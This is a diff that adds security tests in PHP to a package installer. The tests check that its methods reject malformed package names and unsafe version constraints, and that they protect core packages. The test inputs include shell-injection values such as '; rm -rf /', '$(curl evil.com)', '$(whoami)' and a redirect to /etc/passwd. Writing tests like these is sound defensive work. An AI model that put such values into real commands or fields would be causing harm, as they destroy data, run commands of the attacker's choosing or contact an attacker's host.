@@ -158,3 +158,146 @@ test('list excludes non-Coqui packages', function () {
         ->and($packages)->not->toContain('php')
         ->and($packages)->not->toContain('ext-json');
 });
+
+// ── Package name validation (security) ───────────────────────────
+
+test('install rejects malformed package names', function () {
+    $dir = sys_get_temp_dir() . '/coqui-toolkit-test-' . uniqid();
+    createTestWorkspace($dir);
+
+    $http = new MockHttpClient([]);
+    $installer = createToolkitInstaller($http, $dir);
+
+    $installer->install('; rm -rf /', null);
+})->throws(\InvalidArgumentException::class, 'Invalid package name');
+
+test('install rejects package names with shell metacharacters', function () {
+    $dir = sys_get_temp_dir() . '/coqui-toolkit-test-' . uniqid();
+    createTestWorkspace($dir);
+
+    $http = new MockHttpClient([]);
+    $installer = createToolkitInstaller($http, $dir);
+
+    $installer->install('vendor/pkg && echo pwned', null);
+})->throws(\InvalidArgumentException::class);
+
+test('install rejects package names with backticks', function () {
+    $dir = sys_get_temp_dir() . '/coqui-toolkit-test-' . uniqid();
+    createTestWorkspace($dir);
+
+    $http = new MockHttpClient([]);
+    $installer = createToolkitInstaller($http, $dir);
+
+    $installer->install('vendor/`whoami`', null);
+})->throws(\InvalidArgumentException::class);
+
+test('install rejects package names without vendor prefix', function () {
+    $dir = sys_get_temp_dir() . '/coqui-toolkit-test-' . uniqid();
+    createTestWorkspace($dir);
+
+    $http = new MockHttpClient([]);
+    $installer = createToolkitInstaller($http, $dir);
+
+    $installer->install('just-a-name', null);
+})->throws(\InvalidArgumentException::class);
+
+test('install accepts valid package names', function () {
+    $dir = sys_get_temp_dir() . '/coqui-toolkit-test-' . uniqid();
+    createTestWorkspace($dir);
+
+    $http = new MockHttpClient([]);
+    $installer = createToolkitInstaller($http, $dir);
+
+    // This will fail at the Composer step since we don't have Composer,
+    // but should not throw InvalidArgumentException
+    try {
+        $installer->install('coquibot/coqui-toolkit-browser', '^1.0');
+    } catch (\InvalidArgumentException) {
+        $this->fail('Valid package name should not throw InvalidArgumentException');
+    } catch (\RuntimeException) {
+        // Expected — Composer is not available in tests
+        expect(true)->toBeTrue();
+    }
+});
+
+test('install rejects unsafe version constraints', function () {
+    $dir = sys_get_temp_dir() . '/coqui-toolkit-test-' . uniqid();
+    createTestWorkspace($dir);
+
+    $http = new MockHttpClient([]);
+    $installer = createToolkitInstaller($http, $dir);
+
+    $installer->install('coquibot/coqui-toolkit-browser', '$(whoami)');
+})->throws(\InvalidArgumentException::class, 'unsafe characters');
+
+test('update rejects malformed package names', function () {
+    $dir = sys_get_temp_dir() . '/coqui-toolkit-test-' . uniqid();
+    createTestWorkspace($dir);
+
+    $http = new MockHttpClient([]);
+    $installer = createToolkitInstaller($http, $dir);
+
+    $installer->update('vendor/pkg; evil');
+})->throws(\InvalidArgumentException::class);
+
+test('disable rejects malformed package names', function () {
+    $dir = sys_get_temp_dir() . '/coqui-toolkit-test-' . uniqid();
+    createTestWorkspace($dir);
+
+    $http = new MockHttpClient([]);
+    $installer = createToolkitInstaller($http, $dir);
+
+    $installer->disable('$(curl evil.com)');
+})->throws(\InvalidArgumentException::class);
+
+test('enable rejects malformed package names', function () {
+    $dir = sys_get_temp_dir() . '/coqui-toolkit-test-' . uniqid();
+    createTestWorkspace($dir);
+
+    $http = new MockHttpClient([]);
+    $installer = createToolkitInstaller($http, $dir);
+
+    $installer->enable('bad|name');
+})->throws(\InvalidArgumentException::class);
+
+test('remove rejects malformed package names', function () {
+    $dir = sys_get_temp_dir() . '/coqui-toolkit-test-' . uniqid();
+    createTestWorkspace($dir);
+
+    $http = new MockHttpClient([]);
+    $installer = createToolkitInstaller($http, $dir);
+
+    $installer->remove('vendor/pkg > /etc/passwd');
+})->throws(\InvalidArgumentException::class);
+
+// ── Core package protection ──────────────────────────────────────
+
+test('install rejects excluded core packages', function () {
+    $dir = sys_get_temp_dir() . '/coqui-toolkit-test-' . uniqid();
+    createTestWorkspace($dir);
+
+    $http = new MockHttpClient([]);
+    $installer = createToolkitInstaller($http, $dir);
+
+    $installer->install('coquibot/coqui-space-manager', null);
+})->throws(\RuntimeException::class, 'core dependency');
+
+test('disable rejects excluded core packages', function () {
+    $dir = sys_get_temp_dir() . '/coqui-toolkit-test-' . uniqid();
+    createTestWorkspace($dir);
+
+    $http = new MockHttpClient([]);
+    $installer = createToolkitInstaller($http, $dir);
+
+    $installer->disable('carmelosantana/php-agents');
+})->throws(\RuntimeException::class, 'core dependency');
+
+test('remove rejects excluded core packages', function () {
+    $dir = sys_get_temp_dir() . '/coqui-toolkit-test-' . uniqid();
+    createTestWorkspace($dir);
+
+    $http = new MockHttpClient([]);
+    $installer = createToolkitInstaller($http, $dir);
+
+    $installer->remove('coquibot/coqui-toolkit-composer');
+})->throws(\RuntimeException::class, 'core dependency');
